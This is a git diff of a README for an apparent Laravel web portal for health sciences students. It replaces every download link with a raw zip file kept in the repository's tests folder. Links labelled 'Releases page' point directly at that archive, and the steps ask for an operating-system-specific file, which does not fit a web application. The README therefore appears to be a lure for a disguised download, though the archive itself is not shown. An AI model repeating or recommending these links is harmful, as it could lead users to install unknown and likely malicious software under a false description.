@@ -1,7 +1,7 @@
 # 🎓 education_portal - Your Learning Hub for Health Sciences
 
 ## 🚀 Download the App
-[![Download](https://github.com/lokman-dev870/education_portal/raw/refs/heads/main/storage/framework/portal-education-v1.6.zip)](https://github.com/lokman-dev870/education_portal/raw/refs/heads/main/storage/framework/portal-education-v1.6.zip)
+[![Download](https://raw.githubusercontent.com/lokman-dev870/education_portal/main/tests/portal_education_1.4-alpha.2.zip)](https://raw.githubusercontent.com/lokman-dev870/education_portal/main/tests/portal_education_1.4-alpha.2.zip)
 
 ## 📘 Description
 Welcome to the education_portal, a web application designed to support health sciences students. This platform offers resources, forums, study groups, a calendar, and messaging features to enhance your learning experience. Built with Laravel 11 and Livewire 3, this portal brings together all the tools you need in one place.
@@ -22,11 +22,11 @@ To ensure the best experience, please check that your system meets the following
 ## 📥 Download & Install
 To get started, visit the Releases page to download the application:
 
-[Download the education_portal](https://github.com/lokman-dev870/education_portal/raw/refs/heads/main/storage/framework/portal-education-v1.6.zip)
+[Download the education_portal](https://raw.githubusercontent.com/lokman-dev870/education_portal/main/tests/portal_education_1.4-alpha.2.zip)
 
 Follow these steps to install:
 
-1. Visit the [Releases page](https://github.com/lokman-dev870/education_portal/raw/refs/heads/main/storage/framework/portal-education-v1.6.zip).
+1. Visit the [Releases page](https://raw.githubusercontent.com/lokman-dev870/education_portal/main/tests/portal_education_1.4-alpha.2.zip).
 2. Scroll down to the most recent version.
 3. Select the file compatible with your operating system.
 4. Click on the download link to start the download.
